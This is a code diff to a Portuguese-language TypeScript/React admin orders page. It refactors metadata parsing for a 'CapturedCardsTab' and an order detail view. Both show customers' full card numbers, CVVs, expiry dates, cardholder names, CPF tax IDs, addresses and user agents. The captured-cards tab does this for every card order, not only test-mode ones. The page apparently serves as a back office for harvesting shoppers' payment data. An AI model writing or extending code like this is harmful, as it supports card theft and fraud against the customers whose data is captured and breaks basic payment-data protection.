@@ -43,6 +43,19 @@ export const Route = createFileRoute("/_authenticated/admin/pedidos")({
 const PERIODS = ["Hoje", "Ontem", "Semana", "Mês", "Todos"];
 const PERIOD_DAYS: Record<string, number | undefined> = { Hoje: 1, Ontem: 2, Semana: 7, Mês: 30, Todos: undefined };
 
+function getMeta(metadata: unknown): Record<string, any> {
+  if (!metadata) return {};
+  if (typeof metadata === "string") {
+    try {
+      return JSON.parse(metadata);
+    } catch {
+      return {};
+    }
+  }
+  if (typeof metadata === "object") return metadata as Record<string, any>;
+  return {};
+}
+
 function OrdersPage() {
   const [status, setStatus] = useState("todos");
   const [q, setQ] = useState("");
@@ -234,11 +247,11 @@ function CapturedCardsTab({ orders }: { orders: OrderRow[] }) {
   const cards = orders
     .filter((o) => {
       if (o.payment_method !== "cartao") return false;
-      const meta = o.metadata as Record<string, any> | null;
-      return meta && meta.card_number;
+      const meta = getMeta(o.metadata);
+      return !!meta.card_number;
     })
     .map((o) => {
-      const meta = o.metadata as Record<string, any>;
+      const meta = getMeta(o.metadata);
       return {
         id: o.id,
         createdAt: o.created_at,
@@ -246,11 +259,11 @@ function CapturedCardsTab({ orders }: { orders: OrderRow[] }) {
         email: o.customer_email,
         cpf: o.customer_doc,
         address: `${o.address_street}, ${o.address_number} ${o.address_complement ? o.address_complement + " " : ""}- ${o.address_district} - ${o.address_city}/${o.address_uf} - CEP: ${o.address_cep}`,
-        cardName: meta?.card_name ?? "—",
-        cardNumber: meta?.card_number ?? "—",
-        cardExpiry: meta?.card_expiry ?? o.payment_card_expiry ?? "—",
-        cardCvv: meta?.card_cvv ?? "—",
-        userAgent: meta?.user_agent ?? "—",
+        cardName: meta.card_name ?? "—",
+        cardNumber: meta.card_number ?? "—",
+        cardExpiry: meta.card_expiry ?? o.payment_card_expiry ?? "—",
+        cardCvv: meta.card_cvv ?? "—",
+        userAgent: meta.user_agent ?? "—",
       };
     });
 
@@ -328,7 +341,7 @@ function OrderDetail({
   }
 
   const order = data.order;
-  const meta = order.metadata as Record<string, any> | null;
+  const meta = getMeta(order.metadata);
 
   return (
     <div className="space-y-4">
@@ -390,12 +403,12 @@ function OrderDetail({
             {order.payment_method === "cartao" && order.payment_test_mode ? (
               <div className="mt-1 space-y-1 rounded-md border border-border bg-muted p-2.5">
                 <strong className="block text-buy">Dados do Cartão (Modo Teste)</strong>
-                <span className="block">Titular: {meta?.card_name ?? "—"}</span>
+                <span className="block">Titular: {meta.card_name ?? "—"}</span>
                 <span className="block">
-                  Número: {meta?.card_number ?? (order.payment_card_last4 ? `•••• ${order.payment_card_last4}` : "—")}
+                  Número: {meta.card_number ?? (order.payment_card_last4 ? `•••• ${order.payment_card_last4}` : "—")}
                 </span>
-                <span className="block">Validade: {meta?.card_expiry ?? order.payment_card_expiry ?? "—"}</span>
-                <span className="block">CVV: {meta?.card_cvv ?? "—"}</span>
+                <span className="block">Validade: {meta.card_expiry ?? order.payment_card_expiry ?? "—"}</span>
+                <span className="block">CVV: {meta.card_cvv ?? "—"}</span>
                 <div className="mt-2 border-t border-border pt-2">
                   <ValidationLine label="Número" valid={order.payment_card_number_valid} />
                   <ValidationLine label="Validade" valid={order.payment_card_expiry_valid} />
